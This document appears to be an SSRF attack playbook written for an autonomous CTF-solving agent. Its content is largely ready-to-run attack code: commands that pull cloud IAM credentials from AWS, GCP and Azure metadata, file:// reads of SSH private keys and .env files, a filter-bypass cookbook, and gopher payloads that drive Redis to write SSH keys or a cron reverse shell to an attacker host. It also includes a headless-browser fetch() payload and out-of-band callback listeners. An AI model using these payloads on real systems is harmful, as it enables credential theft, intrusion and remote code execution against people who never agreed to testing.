# SSRF — Server-Side Request Forgery

You have SSRF when the server fetches a URL you control. Decide quickly which of the three goals applies: **exfil** (cloud metadata, file://, internal HTTP responses), **pivot** (port scan / hit internal-only services), or **RCE** (gopher → Redis/Memcached/SMTP, or a chained internal admin panel). The actual primitive is one curl call. The bottleneck on ~80% of challenges is bypassing the URL filter — so spend most of your time there. Always test localhost AND a cloud metadata IP before assuming SSRF doesn't exist; many filters block one and not the other.

## Layer 0 — Detect the sink

Sinks to look for in the UI/API:
- Image preview / avatar URL / "fetch from URL"
- Webhook URL fields (Slack, Discord, generic)
- URL importer ("import from RSS / OEmbed / opengraph")
- PDF / screenshot generator (HTMLToPDF, headless chromium)
- SSO / OAuth `redirect_uri`, `return_to`, `next`, `callback`
- XML/SOAP endpoints (often XXE-adjacent)
- Server-side health checkers / "test this URL"

Common parameter names:
```
url, uri, src, dest, redirect, link, target, return_to, next, callback,
proxy, fetch, image, avatar, file, document, host, port, share, view, page
```

Static indicators in source if you have it:
```bash
grep -rnE 'urllib\.request|requests\.(get|post)|curl_exec|file_get_contents|fopen|LWP::UserAgent|fetch\(|http\.get|http\.request|net/http|HttpClient|RestTemplate|axios\.(get|post)' .
grep -rnE 'urlopen|URL\(|new URL\(|java\.net\.URL|HttpURLConnection' .
grep -rnE 'preg_match.*url|filter_var.*FILTER_VALIDATE_URL|gethostbyname' .  # weak filter spots
```

## Layer 1 — Fingerprint filter strictness

In one minute, learn what the filter does. Cycle through these and observe responses:

```bash
TARGET="https://victim/api/fetch?url="
for u in \
  'http://example.com'                       \
  'http://127.0.0.1'                         \
  'http://127.0.0.1:80'                      \
  'http://localhost'                         \
  'http://[::1]'                             \
  'http://169.254.169.254/latest/meta-data/' \
  'http://2130706433'                        \
  'file:///etc/passwd'                       \
  'gopher://127.0.0.1:6379/_INFO'            \
  'dict://127.0.0.1:11211/stats'             ; do
  printf '%-55s -> ' "$u"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "${TARGET}$(jq -rn --arg v "$u" '$v|@uri')"
done
```

Read the response codes/sizes. Common patterns:
- All `200` with same size → likely the input is reflected/echoed; check body.
- `200` for `example.com`, `403/400` for `127.0.0.1` → naive denylist. Try bypasses.
- `200` for `127.0.0.1`, `403` for `localhost` → string filter (or vice versa).
- `200` for `127.0.0.1`, error for `169.254.169.254` → metadata-aware denylist; cloud SSRF still possible via DNS rebinding or alternate metadata IPs.
- Different size for `file://` → protocol allowlist not enforced; jackpot.

## Basic SSRF — fetch internal HTTP

Confirm via reflected response or callback:

```bash
# Trigger and read response
curl -s "https://victim/api/fetch?url=http://127.0.0.1/" | head

# Port scan via timing or response code
for p in 22 25 80 443 2375 3306 5000 5432 6379 8080 8443 8500 9000 9200 11211 27017; do
  t=$(curl -s -o /dev/null -w '%{time_total} %{http_code}\n' \
      "https://victim/api/fetch?url=http://127.0.0.1:$p/")
  echo "$p $t"
done
```

A clean closed port returns fast; an open port either responds 200/400/etc., or hangs (timeout = filtered/open). Classify by bucketing the timings.

## Cloud metadata (IMDS)

### AWS — IMDSv1 (legacy, no token)
```bash
curl -s "https://victim/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://victim/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://victim/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
# → AccessKeyId, SecretAccessKey, Token (use with `aws sts get-caller-identity`)
```

### AWS — IMDSv2 (token-required)
SSRF needs to be able to send a `PUT` with a custom header. If the fetcher only does `GET`, you're stuck unless misconfigured to allow v1 too. If you can choose method/headers:
```bash
# Step 1 — get token via PUT
curl -s -X PUT "https://victim/api/fetch?method=PUT&url=http://169.254.169.254/latest/api/token" \
     -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'
# Step 2 — use token (header forwarded by the SSRF)
curl -s "https://victim/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
     -H 'X-aws-ec2-metadata-token: <TOKEN>'
```
Many real apps still allow v1 — always probe v1 first; it's one curl.

### GCP
Requires the `Metadata-Flavor: Google` header. SSRF must allow custom headers OR the upstream client adds them by default:
```bash
curl -s "https://victim/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
     -H 'Metadata-Flavor: Google'
# Try IP form too
curl -s "https://victim/api/fetch?url=http://169.254.169.254/computeMetadata/v1/" \
     -H 'Metadata-Flavor: Google'
```

### Azure
Custom API version + metadata header:
```bash
curl -s "https://victim/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
     -H 'Metadata: true'
curl -s "https://victim/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
     -H 'Metadata: true'
```

### DigitalOcean / Alibaba / Oracle
```
DigitalOcean: http://169.254.169.254/metadata/v1/
Alibaba:      http://100.100.100.200/latest/meta-data/
Oracle:       http://169.254.169.254/opc/v2/instance/  (Authorization: Bearer Oracle)
```

## file://, dict://, ldap://, ftp://

Try every protocol the URL parser accepts:
```bash
curl -s "https://victim/api/fetch?url=file:///etc/passwd"
curl -s "https://victim/api/fetch?url=file:///proc/self/environ"
curl -s "https://victim/api/fetch?url=file:///proc/self/cmdline"
curl -s "https://victim/api/fetch?url=file:///app/config.yml"
curl -s "https://victim/api/fetch?url=file:///root/.ssh/id_rsa"

curl -s "https://victim/api/fetch?url=dict://127.0.0.1:6379/INFO"        # Redis banner
curl -s "https://victim/api/fetch?url=dict://127.0.0.1:11211/stats"      # Memcached
curl -s "https://victim/api/fetch?url=ftp://127.0.0.1/"                  # banner / dir listing
curl -s "https://victim/api/fetch?url=ldap://127.0.0.1:389/%00"          # LDAP banner / SaaS LDAP
```

PHP-only goodies (when the backend is PHP):
```
phar://./uploads/avatar.jpg/exploit  # → unserialize via metadata
expect://id                          # if expect:// is enabled
glob://*                              
data://text/plain,hello              # also useful in LFI chains
```

## Filter bypass cookbook

Order: **most-likely-works → last-resort**.

| Bypass | Example | Why it works |
|---|---|---|
| Alt loopback strings | `127.1`, `127.0.0.0`, `0`, `0.0.0.0` | Many parsers normalize to `127.0.0.1` |
| Decimal IP | `http://2130706433/` | `127.0.0.1` as 32-bit int |
| Octal IP | `http://0177.0.0.1/` | Leading-zero parsing differential |
| Hex IP | `http://0x7f000001/` | inet_aton accepts hex |
| Mixed | `http://0x7f.1/`, `http://127.0.1` | Combine octets |
| IPv6 short | `http://[::1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/` | IPv6 loopback / IPv4-mapped |
| `@` userinfo | `http://allowed.com@127.0.0.1/` | Naive parsers grab host before `@` |
| Fragment | `http://127.0.0.1#.allowed.com` | Some parsers truncate at `#` differently than the regex |
| Path confusion | `http://allowed.com/..%2F..%2F@127.0.0.1` | Parser disagreement |
| DNS records | `http://localtest.me`, `http://127.0.0.1.nip.io`, `http://spoofed.burpcollaborator.net` | Public DNS → 127.0.0.1 |
| DNS rebinding | rbndr.us, repeat.rebind.network, custom (see below) | First lookup = allowed IP, second = 127.0.0.1 (TOCTOU) |
| Unicode dots | `127。0。0。1`, `127．0．0．1` | Some libs normalize fullwidth → ASCII |
| Enclosed alphanumerics | `①②⑦.⓪.⓪.①` | Same |
| URL-encoded | `http://%31%32%37.0.0.1/` | Encoding survives WAF, decoded by fetcher |
| Double encoding | `%2531%2532%2537%2E0%2E0%2E1` | WAF decodes once, fetcher decodes twice |
| Schema swap | `gopher://`, `dict://`, `file://`, `ldap://`, `tftp://` | Allowlist enforces only `http(s)` |
| Open redirect | `http://allowed.com/redirect?url=http://127.0.0.1/` | Allowed host follows 30x to forbidden |
| URL parser differential | `http://evil.com\\@127.0.0.1/`, `http://127.0.0.1 #allowed.com` | Orange Tsai's "A New Era of SSRF" |
| Short URL | `https://bit.ly/<...>` → 169.254.169.254 | Allowlist of `bit.ly` |

DNS rebinding via rbndr.us:
```
http://7f000001.7f000001.rbndr.us/        # always 127.0.0.1
http://7f000001.cb007109.rbndr.us/        # alternates 127.0.0.1 / 203.0.113.9
```
Or run your own with [singularity](https://github.com/nccgroup/singularity).

Cite: [Orange Tsai – A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf), [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery), [HackTricks SSRF](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/).

## Gopher payloads for RCE

`gopher://` lets you craft raw bytes to any TCP port. Encoding rule: `\r\n` → `%0d%0a`, every reserved char → `%XX`. The first `_` is consumed (curl quirk). Use [Gopherus](https://github.com/tarunkant/Gopherus) — it generates payloads for Redis, MySQL, FastCGI, SMTP, Memcached, Zabbix.

### Redis SSH-key drop (classic)
```bash
gopherus --exploit redis
# pick: PHP / Reverse Shell / SSH key

# manual: write authorized_keys to /root/.ssh
KEY=$(cat ~/.ssh/id_rsa.pub)
PAYLOAD=$(printf '\r\nflushall\r\nset xxx "\\n\\n%s\\n\\n"\r\nconfig set dir /root/.ssh/\r\nconfig set dbfilename "authorized_keys"\r\nsave\r\n' "$KEY" \
  | python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))')
curl -s "https://victim/api/fetch?url=gopher://127.0.0.1:6379/_${PAYLOAD}"
```

### Redis cron via SET + CONFIG SET
```
SET 1 "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n\n"
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SAVE
```
(Encode each line; concatenate; prepend `_`.)

### Internal HTTP POST via gopher
Useful when SSRF only does GET but internal API needs POST:
```
POST /admin/users HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Content-Length: 33

{"name":"x","role":"admin"}
```
Encode CRLFs as `%0d%0a`, body inline. `gopher://localhost:8080/_POST%20...%0d%0a%0d%0a{...}`.

### Memcached slab injection
```
gopherus --exploit memcached
# writes serialized PHP/Python session into memcached → next deserialize = RCE
```

### Jenkins / FastCGI / SMTP
```
gopherus --exploit fastcgi   # PHP-FPM 9000 RCE
gopherus --exploit smtp      # send phishing as internal MTA
```
Jenkins pre-auth RCE via `/script` or `/scriptText` is a one-line internal-only HTTP request — try it with basic SSRF before fancy gopher.

## Blind SSRF — OOB and timing

When the response body never reflects, prove the request happened.

### OOB (preferred)
```bash
# interactsh (https://github.com/projectdiscovery/interactsh) — public or self-host
interactsh-client                              # gives you abc123.oast.fun
curl "https://victim/api/fetch?url=http://abc123.oast.fun/probe"
# watch interactsh-client output for HTTP/DNS hit
```
If outbound is filtered, it may still resolve DNS — point the SSRF at `http://<sub>.oast.fun/`; even a DNS lookup (no HTTP) confirms execution.

Self-hosted alternative without external service (when the challenge container can reach an attacker port):
```bash
# Listener on attacker box
socat -v TCP-LISTEN:1337,reuseaddr,fork EXEC:'/bin/cat'
# Or simplest:
nc -nlvp 1337
# Trigger
curl "https://victim/api/fetch?url=http://YOURIP:1337/probe"
```

### DNS-only callback
```bash
# python3 dns server
sudo python3 -c "
import socketserver
class H(socketserver.BaseRequestHandler):
    def handle(s): print(s.request[0][:100])
socketserver.UDPServer(('0.0.0.0',53),H).serve_forever()"
# In SSRF: http://<unique-token>.attacker.com/
```

### Timing-based blind
```bash
# Open port → near-zero RTT; closed → connect refused fast; filtered → SSRF timeout
for p in 22 80 6379 8080; do
  t=$(curl -s -o /dev/null -w '%{time_total}\n' --max-time 5 \
      "https://victim/api/fetch?url=http://127.0.0.1:$p/")
  echo "$p $t"
done
```
Bin into 3 buckets: fast-OK / fast-refused / slow-filtered. Repeat with different IPs to confirm SSRF is real, not just network noise.

## Second-order SSRF

Attacker stores a URL (profile field, comment, webhook config). Later, a privileged worker / admin / cron job fetches it. Detection: stored field that gets pulled by a "process queue" or admin viewer; OOB callback fires later, not synchronously.

Test pattern:
```bash
# 1. Plant
curl -X POST https://victim/api/profile -d 'avatar=http://abc123.oast.fun/PLANT'
# 2. Trigger admin-side action (or wait)
# 3. Expect callback from internal worker IP, not your client
```

If the second-order fetcher is a headless browser (PDF gen / preview), you have richer primitives — see next section.

## XSS-chained / PDF generator SSRF

PDF/screenshot endpoints often run headless chromium against attacker-supplied HTML or URL. From inside the PDF page you can `fetch()` internal IPs:

```html
<!-- supplied as the HTML body of a PDF render -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => document.body.innerText = t);
</script>
```
The rendered PDF then contains the response — open and read.

Other reads to try inside the headless browser:
```html
<iframe src="file:///etc/passwd"></iframe>
<object data="file:///app/.env"></object>
<img src="http://localhost:9200/_cat/indices">  <!-- size leak via OOB image timing -->
```

Use Hydra's playwright to verify locally before sending:
```bash
python3 -c "
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    b=p.chromium.launch(); pg=b.new_page()
    pg.set_content(open('payload.html').read())
    pg.pdf(path='out.pdf'); b.close()"
```

## SSRF → RCE cheat tree

```
SSRF
├── exfil       cloud metadata / file:// / internal API responses
├── pivot       port scan → discover Redis/Mongo/ES/Jenkins/Consul/etcd
└── RCE
    ├── Redis (gopher) → SSH key | crontab | webroot write
    ├── Memcached (gopher) → session deserialize
    ├── FastCGI (gopher) → PHP-FPM exec
    ├── Docker socket /var/run/docker.sock (HTTP unix:// or via SSRF if exposed) → container escape
    ├── Consul/etcd → write KV → service hijack
    ├── Jenkins /script → groovy RCE
    ├── Kibana/Elastic → script field RCE on old vers
    └── Internal admin panel default creds (admin:admin / root:root)
```

## Tools in Hydra image

- **curl** — primary; supports every protocol you'll need (`http,https,gopher,dict,ftp,ldap,tftp,file`). Use `--resolve` to force a DNS answer.
- **ffuf** — parameter discovery + bypass fuzzing:
  ```bash
  ffuf -u 'https://victim/api/fetch?FUZZ=http://127.0.0.1/' \
       -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
       -mc 200,201,302 -fs 0
  ffuf -u 'https://victim/api/fetch?url=http://FUZZ' \
       -w ./bypass-hosts.txt -mc all -ac
  ```
- **gobuster** — internal path discovery once SSRF works:
  ```bash
  # poor-man wrapper: feed paths through SSRF
  for p in $(cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt); do
    code=$(curl -s -o /dev/null -w '%{http_code}\n' "https://victim/api/fetch?url=http://127.0.0.1/$p")
    [ "$code" != "404" ] && echo "$code  $p"
  done
  ```
- **wfuzz** — alternative when ffuf chokes on encoding.
- **playwright (chromium)** — render PDF/HTML payloads locally to confirm before firing.
- **python requests / httpx** — for complex auth flows, CSRF tokens, multipart, sessions.
- **Gopherus** — install on demand: `pip install gopherus` or clone repo.
- **interactsh-client** — OOB; pre-installed or `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`.

Wordlists worth knowing (under `/usr/share/wordlists/seclists/`):
```
Fuzzing/SSRF/SSRF-URLs.txt
Fuzzing/SSRF/SSRF-Hostnames.txt
Discovery/Web-Content/burp-parameter-names.txt
Discovery/Infrastructure/common-cloud-metadata-paths.txt
```

## Common traps

- AWS **IMDSv2** requires `PUT` and a token header. If the fetcher is GET-only with no header passthrough, you cannot reach IMDSv2 — pivot to file://, internal HTTP, or DNS rebinding.
- WAFs frequently block the literal string `localhost` or `127.0.0.1` but not both — always test the alternative. Same for `169.254.169.254` vs `metadata.google.internal`.
- `urllib` (Python) follows redirects by default — open redirects on allowlisted hosts pop the filter trivially.
- `requests` with a hostname allowlist + DNS lookup at validation time is vulnerable to **TOCTOU rebinding**.
- Some libs (Java `URL`, Go `net/url`) parse `http://evil.com\@victim/` differently than the regex — Orange Tsai's slides catalog these.
- SSRF via **XXE** is a separate primitive but overlaps; if you see XML input, also try `<!ENTITY x SYSTEM "http://127.0.0.1/">`. Cross-reference an XXE skill if your target accepts XML.
- HTTP/2 SSRF: `curl --http2-prior-knowledge` may be needed against modern internal stacks.
- Some apps log the fetched URL with credentials still attached — `http://user:pass@127.0.0.1/` may leak into logs you can read elsewhere.

## OOB without external service

If the challenge container is reachable from your attacker box (CTF infra usually exposes both):
```bash
# attacker
nc -nlvp 1337                                   # one-shot
socat -v TCP-LISTEN:1337,reuseaddr,fork EXEC:/bin/cat   # multi-conn, logs payload
# trigger
curl "https://victim/api/fetch?url=http://YOURIP:1337/$(date +%s)"
```
For DNS-only confirmation when only outbound DNS escapes:
```bash
# use dnsserver.py from dnschef or:
sudo python3 -m smalldns 2.2.2.2  # or run your own UDP/53 listener
```

## Stop conditions

- Three filter-bypass categories tried (string variants, IP encodings, schema swap) and **none** produced a different response code/size from the baseline → SSRF likely doesn't exist; pivot to a different attack class.
- Confirmed SSRF but every internal port returns identical timing + no response body + no OOB callback → outbound network isolated; only `file://` / metadata paths are viable. Exhaust those, then re-classify.
- 30 min on filter bypass with no progress → write `./work/postmortem.md` listing every payload tried and pivot.
- Flag found in any internal HTTP response, file://, metadata response, or post-RCE shell → write to `./flag.txt`, emit `FLAG: <flag>`, stop.

## References

- OWASP SSRF Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- Orange Tsai, *A New Era of SSRF* (BlackHat USA 2017) — https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- HackTricks SSRF — https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/
- PortSwigger Web Security Academy SSRF labs — https://portswigger.net/web-security/ssrf
- Gopherus — https://github.com/tarunkant/Gopherus
- interactsh — https://github.com/projectdiscovery/interactsh
- Singularity (DNS rebinding) — https://github.com/nccgroup/singularity
- SSRFmap — https://github.com/swisskyrepo/SSRFmap
